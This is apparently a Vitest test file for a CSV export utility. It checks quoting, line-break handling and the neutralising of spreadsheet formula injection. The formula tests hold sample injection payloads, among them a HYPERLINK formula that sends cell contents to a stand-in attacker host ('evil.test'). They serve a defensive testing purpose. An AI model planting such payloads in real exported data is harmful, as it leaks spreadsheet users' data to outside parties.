import { describe, expect, it } from "vitest";

import { objectsToCsv, sanitizeValue } from "./csvUtils";

/**
 * Minimal RFC 4180 reader, used to assert on the *parsed* shape of the CSV
 * rather than on the exact escaping we happen to emit. CR, LF and CRLF are all
 * record separators.
 */
const parseCsv = (input: string): string[][] => {
  const rows: string[][] = [];
  let row: string[] = [];
  let field = "";
  let inQuotes = false;

  for (let i = 0; i < input.length; i++) {
    const char = input[i];

    if (inQuotes) {
      if (char === '"') {
        if (input[i + 1] === '"') {
          field += '"';
          i++;
        } else {
          inQuotes = false;
        }
      } else {
        field += char;
      }
      continue;
    }

    if (char === '"') {
      inQuotes = true;
    } else if (char === ",") {
      row.push(field);
      field = "";
    } else if (char === "\r" || char === "\n") {
      if (char === "\r" && input[i + 1] === "\n") i++;
      row.push(field);
      rows.push(row);
      row = [];
      field = "";
    } else {
      field += char;
    }
  }

  row.push(field);
  rows.push(row);

  return rows;
};

describe("csvUtils", () => {
  describe("fn: sanitizeValue", () => {
    it("should leave ordinary values untouched", () => {
      expect(sanitizeValue("hello")).toEqual("hello");
      expect(sanitizeValue("")).toEqual("");
      expect(sanitizeValue("user@example.com")).toEqual("user@example.com");
    });

    it("should quote commas and double up quotes", () => {
      expect(sanitizeValue("a,b")).toEqual('"a,b"');
      expect(sanitizeValue('say "hi"')).toEqual('"say ""hi"""');
    });

    it("should quote every line break, including a bare CR", () => {
      for (const breakChar of ["\n", "\r", "\r\n"]) {
        expect(sanitizeValue(`a${breakChar}b`)).toEqual(`"a${breakChar}b"`);
      }
    });

    it("should neutralise values a spreadsheet would evaluate as a formula", () => {
      for (const value of ["=1+1", "+1", "-1", "@SUM(A1)", "\tcmd", "\rcmd", "  =1+1"]) {
        // The value may also need CSV quoting (a bare CR does), so assert on the
        // parsed field rather than on the raw escaped string.
        const [[field]] = parseCsv(sanitizeValue(value));

        expect(field.startsWith("'"), JSON.stringify(value)).toBe(true);
      }
    });

    it("should not treat a formula character in the middle of a value as a trigger", () => {
      expect(sanitizeValue("2+2 meeting")).toEqual("2+2 meeting");
      expect(sanitizeValue("Q&A - weekly")).toEqual("Q&A - weekly");
    });
  });

  describe("fn: objectsToCsv", () => {
    it("should return an empty string for no rows", () => {
      expect(objectsToCsv([])).toEqual("");
    });

    it("should keep one record per row when a value contains a bare CR", () => {
      const csv = objectsToCsv([
        { uid: "abc", title: "normal", attendee: "Alice" },
        { uid: "def", title: "CR\rinjected", attendee: "Bob" },
      ]);

      const parsed = parseCsv(csv);

      // header + 2 records — previously the CR split the second one in half and
      // shifted every column after it.
      expect(parsed).toHaveLength(3);
      expect(parsed[2]).toEqual(["def", "CR\rinjected", "Bob"]);
      expect(parsed.every((row) => row.length === 3)).toBe(true);
    });

    it("should round-trip commas, quotes and newlines", () => {
      const rows = [{ uid: "abc", title: 'a,b "c"\nd', attendee: "Alice" }];

      const parsed = parseCsv(objectsToCsv(rows));

      expect(parsed).toHaveLength(2);
      expect(parsed[1]).toEqual(["abc", 'a,b "c"\nd', "Alice"]);
    });

    it("should neutralise a formula even when the value also needs quoting", () => {
      const csv = objectsToCsv([{ title: '=HYPERLINK("https://evil.test?d="&A1,"Click")' }]);

      const parsed = parseCsv(csv);

      // Quoting alone does not help: spreadsheets strip the quotes before
      // evaluating, so the leading = has to go.
      expect(parsed[1][0].startsWith("=")).toBe(false);
      expect(parsed[1][0]).toEqual('\'=HYPERLINK("https://evil.test?d="&A1,"Click")');
    });

    it("should coerce non-string values and treat null/undefined as empty", () => {
      const parsed = parseCsv(objectsToCsv([{ a: 1, b: null, c: undefined, d: false }]));

      expect(parsed[1]).toEqual(["1", "", "", "false"]);
    });
  });
});
